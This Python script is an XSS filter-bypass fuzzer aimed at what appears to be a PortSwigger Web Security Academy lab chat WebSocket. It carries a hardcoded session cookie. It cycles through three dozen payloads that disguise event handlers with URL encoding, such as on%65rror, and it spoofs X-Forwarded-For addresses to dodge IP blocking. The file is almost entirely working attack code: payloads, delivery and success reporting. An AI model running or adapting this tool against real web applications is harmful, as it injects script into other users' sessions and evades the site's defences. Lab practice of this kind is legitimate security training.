#!/usr/bin/env python3
import asyncio
import websockets
import json

# Configuration
TARGET_URL = "wss://0af9006504a70472809003cb002b0085.web-security-academy.net/chat"
SESSION_COOKIE = "DCLEtam3QSXcpbFtD0rqXUMHx8y2LtAg"
ORIGIN = "https://0af9006504a70472809003cb002b0085.web-security-academy.net"

async def test_single_payload(payload, ip):
    """Test a single payload"""
    headers = {
        'X-Forwarded-For': f'10.0.{ip // 256}.{ip % 256}',
        'Cookie': f'session={SESSION_COOKIE}',
        'Origin': ORIGIN,
    }
    
    try:
        async with websockets.connect(TARGET_URL, extra_headers=headers) as ws:
            message = json.dumps({"message": payload})
            await ws.send(message)
            
            response = await asyncio.wait_for(ws.recv(), timeout=2)
            
            if "error" in response:
                error = json.loads(response).get("error", "")
                return False, error
            else:
                return True, response[:100]
    except Exception as e:
        return False, str(e)[:50]

async def main():
    print("Testing XSS with URL encoding on different tags/events")
    print("="*60)
    
    # Key finding: on%65rror works, so let's test this pattern systematically
    test_cases = [
        # IMG tests with on%65rror (known to work)
        ("<img src=x on%65rror=print(1)>", "img with on%65rror=print"),
        ("<img src=x on%65rror=confirm(1)>", "img with on%65rror=confirm"),
        ("<img src=x on%65rror=prompt(1)>", "img with on%65rror=prompt"),
        
        # Try other tags with on%65rror
        ("<svg on%65rror=print(1)>", "svg with on%65rror"),
        ("<video on%65rror=print(1)>", "video with on%65rror"),
        ("<audio on%65rror=print(1)>", "audio with on%65rror"),
        ("<object on%65rror=print(1)>", "object with on%65rror"),
        ("<embed on%65rror=print(1)>", "embed with on%65rror"),
        ("<iframe on%65rror=print(1)>", "iframe with on%65rror"),
        ("<body on%65rror=print(1)>", "body with on%65rror"),
        
        # Try encoding other events
        ("<img src=x on%6coad=print(1)>", "img with on%6coad (onload)"),
        ("<svg on%6coad=print(1)>", "svg with on%6coad (onload)"),
        ("<body on%6coad=print(1)>", "body with on%6coad (onload)"),
        
        # on%66ocus (onfocus)
        ("<input autofocus on%66ocus=print(1)>", "input with on%66ocus"),
        ("<textarea autofocus on%66ocus=print(1)>", "textarea with on%66ocus"),
        ("<select autofocus on%66ocus=print(1)>", "select with on%66ocus"),
        
        # on%63lick (onclick)
        ("<img on%63lick=print(1)>", "img with on%63lick"),
        ("<svg on%63lick=print(1)>", "svg with on%63lick"),
        ("<button on%63lick=print(1)>Click</button>", "button with on%63lick"),
        
        # on%6douseover (onmouseover)
        ("<img on%6douseover=print(1)>", "img with on%6douseover"),
        ("<svg on%6douseover=print(1)>", "svg with on%6douseover"),
        
        # Try different encoding positions
        ("<img src=x o%6eerror=print(1)>", "img with o%6eerror"),
        ("<img src=x on%65%72ror=print(1)>", "img with on%65%72ror"),
        ("<img src=x on%65%72%72or=print(1)>", "img with on%65%72%72or"),
        ("<img src=x on%65%72%72%6fr=print(1)>", "img with on%65%72%72%6fr"),
        ("<img src=x on%65%72%72%6f%72=print(1)>", "img with fully encoded error"),
        
        # Try with src/href attributes that might trigger
        ("<img src='x' on%65rror=print(1)>", "img with quoted src"),
        ("<img src on%65rror=print(1)>", "img without src value"),
        ("<img src='' on%65rror=print(1)>", "img with empty src"),
        ("<img src='javascript:' on%65rror=print(1)>", "img with javascript: src"),
        
        # Special autofocus combinations
        ("<input autofocus on%65rror=print(1)>", "input autofocus on%65rror"),
        ("<keygen autofocus on%65rror=print(1)>", "keygen autofocus on%65rror"),
        
        # Less common but potentially unfiltered tags
        ("<image src=x on%65rror=print(1)>", "image tag with on%65rror"),
        ("<img2 src=x on%65rror=print(1)>", "img2 tag with on%65rror"),
        ("<video2 on%65rror=print(1)>", "video2 tag with on%65rror"),
        ("<audio2 on%65rror=print(1)>", "audio2 tag with on%65rror"),
    ]
    
    successful = []
    
    for i, (payload, description) in enumerate(test_cases, 1):
        print(f"[{i}/{len(test_cases)}] Testing: {description}")
        success, result = await test_single_payload(payload, i)
        
        if success:
            print(f"    [+] SUCCESS! Payload works")
            successful.append(payload)
        else:
            if "Event handler" not in result and "Alert" not in result:
                print(f"    [-] Failed: {result}")
        
        await asyncio.sleep(0.5)  # Rate limiting
    
    print("\n" + "="*60)
    if successful:
        print(f"[+] Found {len(successful)} working XSS payloads:\n")
        for payload in successful:
            print(f"  {payload}")
        
        print("\n[*] Key findings:")
        print("  - The filter blocks 'onerror' but NOT 'on%65rror' (URL encoded 'e')")
        print("  - These payloads will execute when the image fails to load")
        print("  - Use print(1), confirm(1), or prompt(1) instead of alert(1)")
    else:
        print("[-] No successful bypasses found with these encodings")

if __name__ == "__main__":
    asyncio.run(main())